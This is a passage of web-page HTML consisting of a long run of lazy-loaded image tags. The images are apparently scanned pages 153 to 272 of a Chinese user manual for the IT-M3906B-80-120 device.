data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/21a85a8268cb5006100a164fb3b34850.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_153"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1ee4e77163820df2f513ebfa3dc45a62.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_154"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/be05a12fcb034d1bc73c83481c76b382.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_155"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/20a72bc82e03456c85b41a7ac7e97be1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_156"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b79a470a79fcb54f5a679ca009cceecb.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_157"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/153b79fefccb70c273e4fcccc86e9784.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_158"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0a41cc9728c457650cab3a7099abe5ee.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_159"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fd2f3b69b7d01692fc08dfe8f0f86380.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_160"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9c6528160e84457b5adf5ad074bdc15b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_161"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2a46280cff61f523dee465296d97dcfa.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_162"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/08772eaee06d760a981a93e213b663cd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_163"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9769a2d3bc4475d662385badab5d0da0.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_164"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ff630d38bc561b72fc53d541143f3036.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_165"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ceb5c4b1052818629c967204a5763cb9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_166"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/88adfbb12579930a4a1257107cc5a600.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_167"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a60dc5c7f07e9a297a00f1ebbcc79d8a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_168"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/30d1c8fa46d5b68bd384ca538e1c4fe1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_169"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/26d2ec10db5a26dd8ccdaeca12185563.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_170"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8832bc8ffaee609fa6424a06978e7365.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_171"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cdd723a54086cbebea841bf9a31bfca7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_172"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/57a6cce6b9e5ea268478937a95b5d1b6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_173"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/51601c63206e2a05fafc3b106c91e084.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_174"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7f58642ae251dc858adca3c0b0bc8b01.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_175"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ac6f74c885d29d7a7473eb09dce86582.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_176"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8cd371bd77acfe54beef8af33398b4c4.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_177"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/50d775bd35f2b86903fa68157e77daa8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_178"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6e46cfffc8188a439ae5a4117e7e572e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_179"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cfa15b501d56668779102a606a32365f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_180"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/37b0944b096969d42d0ebd43950606a6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_181"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4f7c5ff0f8ecd33bffc658bcd14af021.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_182"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/002bd2491efd0f2ec26c88830ef6e5dd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_183"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e58f02ac66dd0b66b68777a066b55c0d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_184"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c02059e6cb92f146a5fa25d708032f49.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_185"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/802f558d95f33e2b99e47b4a9837b065.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_186"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4c677c0952a6ba6c1fc9d45a786101e2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_187"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/85748b9fe0a0b98e7ea2100618e9125c.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_188"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8b28fab6757b88f58a5805ebcee79e5d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_189"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7f77230cafa2ce232b5d436614c47ecf.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_190"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d9b082218d0bac088e455dbab0e068ae.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_191"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4fb243ea1b2fbabbc5879782e3b84093.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_192"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e16b4932084e536094207cf518c00399.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_193"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dd950ff1458e6d3fb0bc473ecd06db98.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_194"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c2312f4266ba0dba5aa89f241d24f396.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_195"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/03829134bdce9c3322cda584e957a99a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_196"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a944036008121beaceea401d4fa8eba7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_197"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e739075f25bc16c1230624a3152b1908.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_198"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/530caeb3e3530e5b2131ccc673bc8158.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_199"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7d8da0c349732cd374a8cbc325f6ea53.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_200"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f7890094d5ec8d866f14020563871ae1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_201"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9e9c47b95a7ecbb60aec9c467952a28c.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_202"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9a2217af206db66e072e15ec12a023f7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_203"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cb62d75ef9d3aeb082b140b86aabb20f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_204"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6fe83ee11dcc1e05c060e11dfb01716b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_205"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2f9d6891f137aa79b02f48f78a18ab0e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_206"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b28865341e0377ed03bda0333a598231.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_207"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1914aaa44cb4728430f62574e572e5c3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_208"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1ab2119453ead48ee02ce649528b0700.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_209"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7b4a14ff6c1f4636aaa78a769860bbcf.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_210"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ccfee3c04e5b72f4ca6e3ffded9f37ba.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_211"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/def87ca68f8b8df34a54e712420912f6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_212"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f96fa5ef7bcd22760ed3238315ef8ea1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_213"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dd7b7948190b1a5fe59f2d09f683c1cf.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_214"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8920edbf46fdd3b486efb2aab38cc200.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_215"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/eff2f8aeb31f4d3eb8a908515ec5708b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_216"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/231b50fb13fe6503b2ebf162d368380c.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_217"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2cd742009ea8e2659505c4d5cb64fbc1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_218"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e6be42101fcfc192f9ed60b79261a1f4.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_219"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/681a8707ae5ed0e0ab72fae5330cf2a2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_220"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9308a8bc19df639e1b112c99ba0e02b3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_221"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a7b0b55b3207ccd474ec61bc547f4ddc.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_222"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/694df0970110891e6022760dc8c96fec.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_223"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/538eabe83e51015a96c2bc0175eba0c2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_224"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3a6bd79f16704b6ab5581d26a500b112.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_225"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9c9b1d5b1462c47c59589caf3f9e4ac2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_226"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7a93cd677960420de4f822fe5706dd36.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_227"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2468f0295c0bb07d3d09f992b9aa7c73.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_228"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5c5db1ec49c08bc76a30e6283ab66f78.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_229"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/36774ce746599602c9612be02f5718bf.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_230"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cc646c216eee6621f50309d59c89e373.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_231"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a1345d69fe7f727d00bb80bdd9a9d4c8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_232"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/08672c123932a4f5e8f30f4f5b809772.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_233"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/73509350e6d9182e407e0f98b52cfa33.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_234"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/79aa3177e34ad5ac5d07b5ec97e1d64e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_235"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a616b60f6ff06122e1bdc21ba999515e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_236"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/84d510d837e5b2b6897db444be3f1a4b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_237"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/baf5d2e926d350f3142a213b034b90c7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_238"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/32c35a2898af6cd087d146b3a2e72170.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_239"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2b185975324f8d02bb7e449b5aec973a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_240"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/92bc59033391656fc756ae5a709e5d7b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_241"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/73289535464a20fb4772a0320a06eb3a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_242"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1daaffa351058eeefa4a208ed1972ee4.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_243"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1f46b289904bdcb2054680ce3675ca01.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_244"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2f8b64aba71e268fa6876953ed2c479f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_245"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d403e73d65f903eea06df20aa48b2fef.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_246"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0995457d27fb7585f19c8f9b3d403623.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_247"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/049ff74fc1e9c9ccea02dc81b8b39638.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_248"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/edc434e540452543b19a58c7ee2e5acb.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_249"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/361d6c4458ffc7ba4c861527b1b5ce2a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_250"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6807b0072f25ed1197a4538d4fd0737d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_251"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3018f356dd0a918271bf267267d9a8cc.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_252"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8c96c06fbc5c6c7528c89f329cd4ff39.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_253"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4914dd42d4f0b40da8068820438edd89.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_254"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d82fedf569eb525ca2d9fa2a5d4fc037.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_255"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c304104b479948ed696c35e564317bd8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_256"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3310450f7c1a84552423dd3f88e6b063.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_257"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9760e1600e36fcc592df3fb9c2b331b6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_258"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9812920c07a8f35ac6d395e15b180747.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_259"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2f07c20b0c057faafd01feb3567b55a1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_260"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/442dbb99ffc069fdb7308f4f34ae8693.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_261"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c9835a0a304d5d9a8e00bf6bac530f70.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_262"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1efdb53a4b1e71a76062e629e689843f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_263"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c5b6ce2b933cff65ae72cc94a927a041.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_264"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b660c5fd1a1fa473ce8b4fe4c235e795.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_265"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/622b972d33a32d1a92e3effe1a47b1ce.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_266"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/22026b35161dbaeddcba6c8ecad573fa.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_267"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1a0c1310150623768f3d698d4a19685a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_268"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f5f4a49aae3b382a03199d4e7bae3f63.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_269"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/864518c46ec81cb4cef0bc25effb759e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_270"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fc2a4d36f275767029d55bda26752be3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_271"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/85b03d4ccc61392bd1130c84322e7f53.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_272"><img src= 